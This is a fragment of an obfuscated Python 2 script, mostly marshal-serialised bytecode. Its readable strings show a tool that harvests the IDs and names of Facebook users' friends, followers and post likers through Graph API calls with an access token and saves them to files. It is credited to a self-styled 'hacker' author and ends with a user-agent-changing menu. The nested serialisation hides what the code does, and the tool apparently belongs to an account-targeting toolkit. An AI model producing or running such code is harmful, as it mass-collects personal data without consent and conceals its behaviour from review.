00\x01t\x18\x00j\x19\x00d\x1c\x00\x83\x01\x00\x01q\xcc\x00W|\x05\x00j\x1a\x00\x83\x00\x00\x01d\x1d\x00GHt\x1b\x00d\x1e\x00t\x05\x00t\x1c\x00t\x05\x00f\x03\x00\x16\x83\x01\x00\x01d\x06\x00GHd\x1f\x00t\x06\x00t\x05\x00t\x1d\x00|\x04\x00t\x05\x00f\x05\x00\x16GHd\x06\x00GHt\x04\x00d \x00t\x06\x00t\x05\x00f\x02\x00\x16\x83\x01\x00\x01t\x1e\x00\x83\x00\x00\x01WnV\x00\x04t\x1f\x00t \x00f\x02\x00k\n\x00rR\x02\x01\x01\x01t\x00\x00j!\x00|\x04\x00\x83\x01\x00\x01t\x1b\x00d!\x00t\x05\x00t\x1d\x00t\x05\x00f\x03\x00\x16\x83\x01\x00\x01t\x04\x00d"\x00t\x06\x00t\x05\x00f\x02\x00\x16\x83\x01\x00\x01t\x1e\x00\x83\x00\x00\x01n\x01\x00Xd\x00\x00S(#\x00\x00\x00Nt\x05\x00\x00\x00cleart\x07\x00\x00\x00extracts&\x00\x00\x00%s[%s\x1b[1;92m?%s] Public link : \x1b[1;92ms$\x00\x00\x00%s[%s\x1b[1;92m?%s] Nama file : \x1b[1;92ms$\x00\x00\x00%s[%s\x1b[1;92m?%s] Limit id  : \x1b[1;92ms8\x00\x00\x00\x1b[1;97m-------------------------------------------------s\x05\x00\x00\x00.jsont\x01\x00\x00\x00 t\x01\x00\x00\x00_t\x01\x00\x00\x00ws>\x00\x00\x00https://graph.facebook.com/%s/friends?limit=%s&access_token=%st\x04\x00\x00\x00datat\x02\x00\x00\x00idt\x01\x00\x00\x00|t\x04\x00\x00\x00names\x01\x00\x00\x00\ns\x07\x00\x00\x00\x1b[1;91ms\x07\x00\x00\x00\x1b[1;92ms\x07\x00\x00\x00\x1b[1;93ms\x07\x00\x00\x00\x1b[1;94ms\x07\x00\x00\x00\x1b[1;95ms\x07\x00\x00\x00\x1b[1;96ms\x07\x00\x00\x00\x1b[1;97ms\x04\x00\x00\x00\x1b[0ms\x08\x00\x00\x00\r\x1b[0m - s:\x00\x00\x00%s%s\r [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses extract Id...s\x08\x00\x00\x00%H:%M:%Sg{\x14\xaeG\xe1zt?s9\x00\x00\x00\n\x1b[1;97m-------------------------------------------------s;\x00\x00\x00%s[%s\x1b[1;92m\xe2\x9c\x93%s] Successfully extract id of public friends2\x00\x00\x00 [%s\x1b[1;92m\xe2\x80\xa2%s] Copy the output file  ( %s%s%s )s\x0f\x00\x00\x00 [%s ENTER%s ] s?\x00\x00\x00%s[%s\x1b[1;91m!%s] Id extract failed, probably id is not public.\ns\x10\x00\x00\x00 [ %sRETURN%s ] ("\x00\x00\x00t\x02\x00\x00\x00ost\x06\x00\x00\x00systemt\x04\x00\x00\x00logot\x05\x00\x00\x00mkdirt\t\x00\x00\x00raw_inputt\x01\x00\x00\x00Nt\x01\x00\x00\x00Ot\x07\x00\x00\x00replacet\x04\x00\x00\x00opent\x08\x00\x00\x00requestst\x03\x00\x00\x00gett\x04\x00\x00\x00jsonR\x06\x00\x00\x00t\x06\x00\x00\x00appendt\x05\x00\x00\x00writet\x06\x00\x00\x00randomt\x06\x00\x00\x00choicet\x03\x00\x00\x00syst\x06\x00\x00\x00stdoutt\x08\x00\x00\x00datetimet\x03\x00\x00\x00nowt\x08\x00\x00\x00strftimet\x03\x00\x00\x00lent\x05\x00\x00\x00flusht\x04\x00\x00\x00timet\x05\x00\x00\x00sleept\x05\x00\x00\x00closet\x05\x00\x00\x00jalant\x01\x00\x00\x00Ht\x01\x00\x00\x00Mt\x04\x00\x00\x00menut\x08\x00\x00\x00KeyErrort\x07\x00\x00\x00IOErrort\x06\x00\x00\x00remove(\x08\x00\x00\x00t\x07\x00\x00\x00sultanit\x03\x00\x00\x00csyt\x03\x00\x00\x00ahht\x03\x00\x00\x00ihht\x03\x00\x00\x00kntt\x02\x00\x00\x00yst\x01\x00\x00\x00aR\x04\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x06\x00\x00\x00publik\x01\x00\x00\x00sB\x00\x00\x00\x00\x01\x03\x01\r\x01\x05\x01\x11\x01\x03\x01\x04\x02\x03\x01\x19\x01\x19\x01\x19\x01\x05\x01\x16\x01\x0f\x01-\x01\x1d\x01!\x01\'\x01A\x01\r\x01\x11\x02\n\x01\x05\x01\x17\x01\x05\x01\x18\x01\x05\x01\x14\x01\x0b\x01\x13\x01\r\x01\x17\x01\x14\x01c\x01\x00\x00\x00\x08\x00\x00\x00\n\x00\x00\x00C\x00\x00\x00s[\x02\x00\x00y#\x00t\x00\x00j\x01\x00d\x01\x00\x83\x01\x00\x01t\x02\x00GHt\x00\x00j\x03\x00d\x02\x00\x83\x01\x00\x01Wn\x07\x00\x01\x01\x01n\x01\x00Xy\xd1\x01t\x04\x00d\x03\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x01\x00t\x04\x00d\x04\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x02\x00t\x04\x00d\x05\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x03\x00d\x06\x00GHd\x07\x00|\x02\x00\x17d\x08\x00\x17j\x07\x00d\t\x00d\n\x00\x83\x02\x00}\x04\x00t\x08\x00|\x04\x00d\x0b\x00\x83\x02\x00}\x05\x00x\xee\x00t\t\x00j\n\x00d\x0c\x00|\x01\x00|\x03\x00|\x00\x00f\x03\x00\x16\x83\x01\x00j\x0b\x00\x83\x00\x00d\r\x00\x19D]\xc6\x00}\x06\x00t\x0c\x00j\r\x00|\x06\x00d\x0e\x00\x19d\x0f\x00\x17|\x06\x00d\x10\x00\x19\x17\x83\x01\x00\x01|\x05\x00j\x0e\x00|\x06\x00d\x0e\x00\x19d\x0f\x00\x17|\x06\x00d\x10\x00\x19\x17d\x11\x00\x17\x83\x01\x00\x01t\x0f\x00j\x10\x00d\x12\x00d\x13\x00d\x14\x00d\x15\x00d\x16\x00d\x17\x00d\x18\x00d\x19\x00g\x08\x00\x83\x01\x00}\x07\x00t\x11\x00j\x12\x00j\x0e\x00d\x1a\x00|\x07\x00\x17d\x1b\x00|\x06\x00d\x10\x00\x19t\x05\x00t\x13\x00j\x14\x00\x83\x00\x00j\x15\x00d\x1c\x00\x83\x01\x00t\x16\x00t\x0c\x00\x83\x01\x00f\x04\x00\x16\x17\x83\x01\x00\x01t\x11\x00j\x12\x00j\x17\x00\x83\x00\x00\x01t\x18\x00j\x19\x00d\x1d\x00\x83\x01\x00\x01q\xd0\x00W|\x05\x00j\x1a\x00\x83\x00\x00\x01d\x1e\x00GHt\x1b\x00d\x1f\x00t\x05\x00t\x1c\x00t\x05\x00f\x03\x00\x16\x83\x01\x00\x01d\x06\x00GHd \x00t\x06\x00t\x05\x00t\x1d\x00|\x04\x00t\x05\x00f\x05\x00\x16GHd\x06\x00GHt\x04\x00d!\x00t\x06\x00t\x05\x00f\x02\x00\x16\x83\x01\x00\x01t\x1e\x00\x83\x00\x00\x01WnV\x00\x04t\x1f\x00t \x00f\x02\x00k\n\x00rV\x02\x01\x01\x01t\x00\x00j!\x00|\x04\x00\x83\x01\x00\x01t\x1b\x00d"\x00t\x05\x00t\x1d\x00t\x05\x00f\x03\x00\x16\x83\x01\x00\x01t\x04\x00d#\x00t\x06\x00t\x05\x00f\x02\x00\x16\x83\x01\x00\x01t\x1e\x00\x83\x00\x00\x01n\x01\x00Xd\x00\x00S($\x00\x00\x00NR\x00\x00\x00\x00R\x01\x00\x00\x00s)\x00\x00\x00%s[%s\x1b[1;92m?%s] Followers Link : \x1b[1;92ms\'\x00\x00\x00%s[%s\x1b[1;92m?%s] file Name    : \x1b[1;92ms)\x00\x00\x00%s[%s\x1b[1;92m?%s]  Id Limit      : \x1b[1;92ms8\x00\x00\x00\x1b[1;97m-------------------------------------------------s\x08\x00\x00\x00extract/s\x05\x00\x00\x00.jsonR\x02\x00\x00\x00R\x03\x00\x00\x00R\x04\x00\x00\x00sB\x00\x00\x00https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%sR\x05\x00\x00\x00R\x06\x00\x00\x00R\x07\x00\x00\x00R\x08\x00\x00\x00s\x01\x00\x00\x00\ns\x07\x00\x00\x00\x1b[1;91ms\x07\x00\x00\x00\x1b[1;92ms\x07\x00\x00\x00\x1b[1;93ms\x07\x00\x00\x00\x1b[1;94ms\x07\x00\x00\x00\x1b[1;95ms\x07\x00\x00\x00\x1b[1;96ms\x07\x00\x00\x00\x1b[1;97ms\x04\x00\x00\x00\x1b[0ms\x08\x00\x00\x00\r\x1b[0m - s:\x00\x00\x00%s%s\r [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses extract Id...s\x08\x00\x00\x00%H:%M:%Sg{\x14\xaeG\xe1zt?s9\x00\x00\x00\n\x1b[1;97m-------------------------------------------------s?\x00\x00\x00%s[%s\x1b[1;92m\xe2\x9c\x93%s] Successfully extract id from total followerss1\x00\x00\x00 [%s\x1b[1;92m\xe2\x80\xa2%s] Copy the output file ( %s%s%s )s\x0f\x00\x00\x00 [%s ENTER%s ] sB\x00\x00\x00%s[%s\x1b[1;91m!%s] Failed to extract id, probably id is not public.\ns\x10\x00\x00\x00 [ %sRETURN%s ] ("\x00\x00\x00R\t\x00\x00\x00R\n\x00\x00\x00R\x0b\x00\x00\x00R\x0c\x00\x00\x00R\r\x00\x00\x00R\x0e\x00\x00\x00R\x0f\x00\x00\x00R\x10\x00\x00\x00R\x11\x00\x00\x00R\x12\x00\x00\x00R\x13\x00\x00\x00R\x14\x00\x00\x00R\x06\x00\x00\x00R\x15\x00\x00\x00R\x16\x00\x00\x00R\x17\x00\x00\x00R\x18\x00\x00\x00R\x19\x00\x00\x00R\x1a\x00\x00\x00R\x1b\x00\x00\x00R\x1c\x00\x00\x00R\x1d\x00\x00\x00R\x1e\x00\x00\x00R\x1f\x00\x00\x00R \x00\x00\x00R!\x00\x00\x00R"\x00\x00\x00R#\x00\x00\x00R$\x00\x00\x00R%\x00\x00\x00R&\x00\x00\x00R\'\x00\x00\x00R(\x00\x00\x00R)\x00\x00\x00(\x08\x00\x00\x00R*\x00\x00\x00R+\x00\x00\x00t\x03\x00\x00\x00mmkt\x03\x00\x00\x00aswt\x02\x00\x00\x00ahR/\x00\x00\x00R0\x00\x00\x00R\x04\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\t\x00\x00\x00followers\'\x00\x00\x00sB\x00\x00\x00\x00\x01\x03\x01\r\x01\x05\x01\x11\x01\x03\x01\x04\x02\x03\x01\x19\x01\x19\x01\x19\x01\x05\x01\x1a\x01\x0f\x01-\x01\x1d\x01!\x01\'\x01A\x01\r\x01\x11\x02\n\x01\x05\x01\x17\x01\x05\x01\x18\x01\x05\x01\x14\x01\x0b\x01\x13\x01\r\x01\x17\x01\x14\x01c\x01\x00\x00\x00\x08\x00\x00\x00\n\x00\x00\x00C\x00\x00\x00sV\x02\x00\x00y#\x00t\x00\x00j\x01\x00d\x01\x00\x83\x01\x00\x01t\x02\x00GHt\x00\x00j\x03\x00d\x02\x00\x83\x01\x00\x01Wn\x07\x00\x01\x01\x01n\x01\x00Xy\xcc\x01t\x04\x00d\x03\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x01\x00t\x04\x00d\x04\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x02\x00t\x04\x00d\x05\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x03\x00d\x06\x00GHd\x07\x00|\x02\x00\x17d\x08\x00\x17j\x07\x00d\t\x00d\n\x00\x83\x02\x00}\x04\x00t\x08\x00|\x04\x00d\x0b\x00\x83\x02\x00}\x05\x00x\xee\x00t\t\x00j\n\x00d\x0c\x00|\x01\x00|\x03\x00|\x00\x00f\x03\x00\x16\x83\x01\x00j\x0b\x00\x83\x00\x00d\r\x00\x19D]\xc6\x00}\x06\x00t\x0c\x00j\r\x00|\x06\x00d\x0e\x00\x19d\x0f\x00\x17|\x06\x00d\x10\x00\x19\x17\x83\x01\x00\x01|\x05\x00j\x0e\x00|\x06\x00d\x0e\x00\x19d\x0f\x00\x17|\x06\x00d\x10\x00\x19\x17d\x11\x00\x17\x83\x01\x00\x01t\x0f\x00j\x10\x00d\x12\x00d\x13\x00d\x14\x00d\x15\x00d\x16\x00d\x17\x00d\x18\x00d\x19\x00g\x08\x00\x83\x01\x00}\x07\x00t\x11\x00j\x12\x00j\x0e\x00d\x1a\x00|\x07\x00\x17d\x1b\x00|\x06\x00d\x10\x00\x19t\x05\x00t\x13\x00j\x14\x00\x83\x00\x00j\x15\x00d\x1c\x00\x83\x01\x00t\x16\x00t\x0c\x00\x83\x01\x00f\x04\x00\x16\x17\x83\x01\x00\x01t\x11\x00j\x12\x00j\x17\x00\x83\x00\x00\x01t\x18\x00j\x19\x00d\x1d\x00\x83\x01\x00\x01q\xd0\x00W|\x05\x00j\x1a\x00\x83\x00\x00\x01d\x1e\x00GHt\x1b\x00d\x1f\x00t\x05\x00t\x1c\x00t\x05\x00f\x03\x00\x16\x83\x01\x00\x01d \x00t\x06\x00t\x05\x00t\x1d\x00|\x04\x00t\x05\x00f\x05\x00\x16GHd\x06\x00GHt\x04\x00d!\x00t\x06\x00t\x05\x00f\x02\x00\x16\x83\x01\x00\x01t\x1e\x00\x83\x00\x00\x01WnV\x00\x04t\x1f\x00t \x00f\x02\x00k\n\x00rQ\x02\x01\x01\x01t\x00\x00j!\x00|\x04\x00\x83\x01\x00\x01t\x1b\x00d"\x00t\x05\x00t\x1d\x00t\x05\x00f\x03\x00\x16\x83\x01\x00\x01t\x04\x00d#\x00t\x06\x00t\x05\x00f\x02\x00\x16\x83\x01\x00\x01t\x1e\x00\x83\x00\x00\x01n\x01\x00Xd\x00\x00S($\x00\x00\x00NR\x00\x00\x00\x00R\x01\x00\x00\x00s%\x00\x00\x00%s[%s\x1b[1;92m?%s] id follow  : \x1b[1;92ms%\x00\x00\x00%s[%s\x1b[1;92m?%s] file name  : \x1b[1;92ms%\x00\x00\x00%s[%s\x1b[1;92m?%s] limit id   : \x1b[1;92ms8\x00\x00\x00\x1b[1;97m-------------------------------------------------s\x08\x00\x00\x00extract/s\x05\x00\x00\x00.jsonR\x02\x00\x00\x00R\x03\x00\x00\x00R\x04\x00\x00\x00sB\x00\x00\x00https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%sR\x05\x00\x00\x00R\x06\x00\x00\x00R\x07\x00\x00\x00R\x08\x00\x00\x00s\x01\x00\x00\x00\ns\x07\x00\x00\x00\x1b[1;91ms\x07\x00\x00\x00\x1b[1;92ms\x07\x00\x00\x00\x1b[1;93ms\x07\x00\x00\x00\x1b[1;94ms\x07\x00\x00\x00\x1b[1;95ms\x07\x00\x00\x00\x1b[1;96ms\x07\x00\x00\x00\x1b[1;97ms\x04\x00\x00\x00\x1b[0ms\x08\x00\x00\x00\r\x1b[0m - s:\x00\x00\x00%s%s \r[\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses extract Id...s\x08\x00\x00\x00%H:%M:%Sg{\x14\xaeG\xe1zt?s9\x00\x00\x00\n\x1b[1;97m-------------------------------------------------s?\x00\x00\x00%s[%s\x1b[1;92m\xe2\x9c\x93%s] Successfully extract id from total followerss0\x00\x00\x00[%s\x1b[1;92m\xe2\x80\xa2%s] Copy the output file ( %s%s%s )s\x0f\x00\x00\x00 [%s ENTER%s ] sB\x00\x00\x00%s[%s\x1b[1;91m!%s] Failed to extract id, probably id is not public.\ns\x10\x00\x00\x00 [ %sRETURN%s ] ("\x00\x00\x00R\t\x00\x00\x00R\n\x00\x00\x00R\x0b\x00\x00\x00R\x0c\x00\x00\x00R\r\x00\x00\x00R\x0e\x00\x00\x00R\x0f\x00\x00\x00R\x10\x00\x00\x00R\x11\x00\x00\x00R\x12\x00\x00\x00R\x13\x00\x00\x00R\x14\x00\x00\x00R\x06\x00\x00\x00R\x15\x00\x00\x00R\x16\x00\x00\x00R\x17\x00\x00\x00R\x18\x00\x00\x00R\x19\x00\x00\x00R\x1a\x00\x00\x00R\x1b\x00\x00\x00R\x1c\x00\x00\x00R\x1d\x00\x00\x00R\x1e\x00\x00\x00R\x1f\x00\x00\x00R \x00\x00\x00R!\x00\x00\x00R"\x00\x00\x00R#\x00\x00\x00R$\x00\x00\x00R%\x00\x00\x00R&\x00\x00\x00R\'\x00\x00\x00R(\x00\x00\x00R)\x00\x00\x00(\x08\x00\x00\x00R*\x00\x00\x00R+\x00\x00\x00R2\x00\x00\x00R3\x00\x00\x00R4\x00\x00\x00R/\x00\x00\x00R0\x00\x00\x00R\x04\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00SazxtR5\x00\x00\x00M\x00\x00\x00s@\x00\x00\x00\x00\x01\x03\x01\r\x01\x05\x01\x11\x01\x03\x01\x04\x02\x03\x01\x19\x01\x19\x01\x19\x01\x05\x01\x1a\x01\x0f\x01-\x01\x1d\x01!\x01\'\x01A\x01\r\x01\x11\x02\n\x01\x05\x01\x17\x01\x18\x01\x05\x01\x14\x01\x0b\x01\x13\x01\r\x01\x17\x01\x14\x01c\x01\x00\x00\x00\x08\x00\x00\x00\n\x00\x00\x00C\x00\x00\x00sV\x02\x00\x00y#\x00t\x00\x00j\x01\x00d\x01\x00\x83\x01\x00\x01t\x02\x00GHt\x00\x00j\x03\x00d\x02\x00\x83\x01\x00\x01Wn\x07\x00\x01\x01\x01n\x01\x00Xy\xcc\x01t\x04\x00d\x03\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x01\x00t\x04\x00d\x04\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x02\x00t\x04\x00d\x05\x00t\x05\x00t\x06\x00t\x05\x00f\x03\x00\x16\x83\x01\x00}\x03\x00d\x06\x00GHd\x07\x00|\x02\x00\x17d\x08\x00\x17j\x07\x00d\t\x00d\n\x00\x83\x02\x00}\x04\x00t\x08\x00|\x04\x00d\x0b\x00\x83\x02\x00}\x05\x00x\xee\x00t\t\x00j\n\x00d\x0c\x00|\x01\x00|\x03\x00|\x00\x00f\x03\x00\x16\x83\x01\x00j\x0b\x00\x83\x00\x00d\r\x00\x19D]\xc6\x00}\x06\x00t\x0c\x00j\r\x00|\x06\x00d\x0e\x00\x19d\x0f\x00\x17|\x06\x00d\x10\x00\x19\x17\x83\x01\x00\x01|\x05\x00j\x0e\x00|\x06\x00d\x0e\x00\x19d\x0f\x00\x17|\x06\x00d\x10\x00\x19\x17d\x11\x00\x17\x83\x01\x00\x01t\x0f\x00j\x10\x00d\x12\x00d\x13\x00d\x14\x00d\x15\x00d\x16\x00d\x17\x00d\x18\x00d\x19\x00g\x08\x00\x83\x01\x00}\x07\x00t\x11\x00j\x12\x00j\x0e\x00d\x1a\x00|\x07\x00\x17d\x1b\x00|\x06\x00d\x10\x00\x19t\x05\x00t\x13\x00j\x14\x00\x83\x00\x00j\x15\x00d\x1c\x00\x83\x01\x00t\x16\x00t\x0c\x00\x83\x01\x00f\x04\x00\x16\x17\x83\x01\x00\x01t\x11\x00j\x12\x00j\x17\x00\x83\x00\x00\x01t\x18\x00j\x19\x00d\x1d\x00\x83\x01\x00\x01q\xd0\x00W|\x05\x00j\x1a\x00\x83\x00\x00\x01d\x1e\x00GHt\x1b\x00d\x1f\x00t\x05\x00t\x1c\x00t\x05\x00f\x03\x00\x16\x83\x01\x00\x01d \x00t\x06\x00t\x05\x00t\x1d\x00|\x04\x00t\x05\x00f\x05\x00\x16GHd\x06\x00GHt\x04\x00d!\x00t\x06\x00t\x05\x00f\x02\x00\x16\x83\x01\x00\x01t\x1e\x00\x83\x00\x00\x01WnV\x00\x04t\x1f\x00t \x00f\x02\x00k\n\x00rQ\x02\x01\x01\x01t\x00\x00j!\x00|\x04\x00\x83\x01\x00\x01t\x1b\x00d"\x00t\x05\x00t\x1d\x00t\x05\x00f\x03\x00\x16\x83\x01\x00\x01t\x04\x00d#\x00t\x06\x00t\x05\x00f\x02\x00\x16\x83\x01\x00\x01t\x1e\x00\x83\x00\x00\x01n\x01\x00Xd\x00\x00S($\x00\x00\x00NR\x00\x00\x00\x00R\x01\x00\x00\x00s%\x00\x00\x00%s[%s\x1b[1;92m?%s] id posting : \x1b[1;92ms%\x00\x00\x00%s[%s\x1b[1;92m?%s] file name  : \x1b[1;92ms\'\x00\x00\x00%s[%s\x1b[1;92m?%s]   limit id   : \x1b[1;92ms8\x00\x00\x00\x1b[1;97m-------------------------------------------------s\x08\x00\x00\x00extract/s\x05\x00\x00\x00.jsonR\x02\x00\x00\x00R\x03\x00\x00\x00R\x04\x00\x00\x00s<\x00\x00\x00https://graph.facebook.com/%s/likes?limit=%s&access_token=%sR\x05\x00\x00\x00R\x06\x00\x00\x00R\x07\x00\x00\x00R\x08\x00\x00\x00s\x01\x00\x00\x00\ns\x07\x00\x00\x00\x1b[1;91ms\x07\x00\x00\x00\x1b[1;92ms\x07\x00\x00\x00\x1b[1;93ms\x07\x00\x00\x00\x1b[1;94ms\x07\x00\x00\x00\x1b[1;95ms\x07\x00\x00\x00\x1b[1;96ms\x07\x00\x00\x00\x1b[1;97ms\x04\x00\x00\x00\x1b[0ms\x08\x00\x00\x00\r\x1b[0m - s:\x00\x00\x00%s%s \r[\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses extract Id...s\x08\x00\x00\x00%H:%M:%Sg{\x14\xaeG\xe1zt?s9\x00\x00\x00\n\x1b[1;97m-------------------------------------------------s9\x00\x00\x00%s[%s\x1b[1;92m\xe2\x9c\x93%s] Successfully extract id from like posts0\x00\x00\x00[%s\x1b[1;92m\xe2\x80\xa2%s] Copy the output file ( %s%s%s )s\x0f\x00\x00\x00 [%s ENTER%s ] s@\x00\x00\x00%s[%s\x1b[1;91m!%s] Id extract failed, maybe the id is not public.\ns\x10\x00\x00\x00 [ %sRETURN%s ] ("\x00\x00\x00R\t\x00\x00\x00R\n\x00\x00\x00R\x0b\x00\x00\x00R\x0c\x00\x00\x00R\r\x00\x00\x00R\x0e\x00\x00\x00R\x0f\x00\x00\x00R\x10\x00\x00\x00R\x11\x00\x00\x00R\x12\x00\x00\x00R\x13\x00\x00\x00R\x14\x00\x00\x00R\x06\x00\x00\x00R\x15\x00\x00\x00R\x16\x00\x00\x00R\x17\x00\x00\x00R\x18\x00\x00\x00R\x19\x00\x00\x00R\x1a\x00\x00\x00R\x1b\x00\x00\x00R\x1c\x00\x00\x00R\x1d\x00\x00\x00R\x1e\x00\x00\x00R\x1f\x00\x00\x00R \x00\x00\x00R!\x00\x00\x00R"\x00\x00\x00R#\x00\x00\x00R$\x00\x00\x00R%\x00\x00\x00R&\x00\x00\x00R\'\x00\x00\x00R(\x00\x00\x00R)\x00\x00\x00(\x08\x00\x00\x00R*\x00\x00\x00R+\x00\x00\x00t\x03\x00\x00\x00ppkR3\x00\x00\x00R,\x00\x00\x00R/\x00\x00\x00R0\x00\x00\x00R\x04\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\t\x00\x00\x00postinganr\x00\x00\x00s@\x00\x00\x00\x00\x01\x03\x01\r\x01\x05\x01\x11\x01\x03\x01\x04\x02\x03\x01\x19\x01\x19\x01\x19\x01\x05\x01\x1a\x01\x0f\x01-\x01\x1d\x01!\x01\'\x01A\x01\r\x01\x11\x02\n\x01\x05\x01\x17\x01\x18\x01\x05\x01\x14\x01\x0b\x01\x13\x01\r\x01\x17\x01\x14\x01c\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s\xbc\x00\x00\x00t\x00\x00j\x01\x00d\x01\x00\x83\x01\x00\x01t\x02\x00GHd\x02\x00GHd\x03\x00GHd\x04\x00t\x03\x00t\x04\x00t\x03\x00f\x03\x00\x16GHt\x05\x00j\x06\x00d\x05\x00\x83\x01\x00\x01d\x06\x00t\x03\x00t\x04\x00t\x03\x00f\x03\x00\x16GHt\x05\x00j\x06\x00d\x05\x00\x83\x01\x00\x01d\x07\x00t\x03\x00t\x04\x00t\x03\x00f\x03\x00\x16GHt\x05\x00j\x06\x00d\x05\x00\x83\x01\x00\x01d\x07\x00t\x03\x00t\x04\x00t\x03\x00f\x03\x00\x16GHt\x05\x00j\x06\x00d\x05\x00\x83\x01\x00\x01d\x03\x00GHt\x07\x00d\x08\x00t\x08\x00t\x03\x00f\x02\x00\x16\x83\x01\x00\x01t\t\x00\x83\x00\x00\x01d\x00\x00S(\t\x00\x00\x00NR\x00\x00\x00\x00s\x15\x00\x00\x00           OWNER INFOs8\x00\x00\x00\x1b[1;97m-------------------------------------------------s\'\x00\x00\x00%s[%s>%s] Author   : \x1b[1;96mPROFAISOR .g\xecQ\xb8\x1e\x85\xeb\xb1?s7\x00\x00\x00%s[%s>%s] Github   : https://github.com/mohammadjan1122sB\x00\x00\x00%s[%s>%s] Facebook : https://www.facebook.com/mohammad.hacker.1122s\x10\x00\x00\x00[ %s RETURN%s ] (\n\x00\x00\x00R\t\x00\x00\x00R\n\x00\x00\x00R\x0b\x00\x00\x00R\x0e\x00\x00\x00R$\x00\x00\x00R \x00\x00\x00R!\x00\x00\x00R\r\x00\x00\x00R\x0f\x00\x00\x00R&\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\n\x00\x00\x00info_tools\x97\x00\x00\x00s\x1e\x00\x00\x00\x00\x01\r\x01\x05\x01\x05\x01\x05\x01\x12\x01\r\x01\x12\x01\r\x01\x12\x01\r\x01\x12\x01\r\x01\x05\x01\x14\x01N(\x04\x00\x00\x00R1\x00\x00\x00R5\x00\x00\x00R7\x00\x00\x00R8\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x08\x00\x00\x00\t&\t&\t%\t%(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01')

def seting_yntkts():
    os.system('clear')
    print logo
    print '[%s\x1b[1;92m1%s] Change user agent' % (O, N)
    print '[%s\x1b[1;92m2%s] Check user agent' % (O, N)
    print '\x1b[1;97m-------------------------------------------------'
    ytbjts = raw_input('%s[%s\x1b[1;92m?%s] Choose : ' % (N, O, N))
    if ytbjts == '':
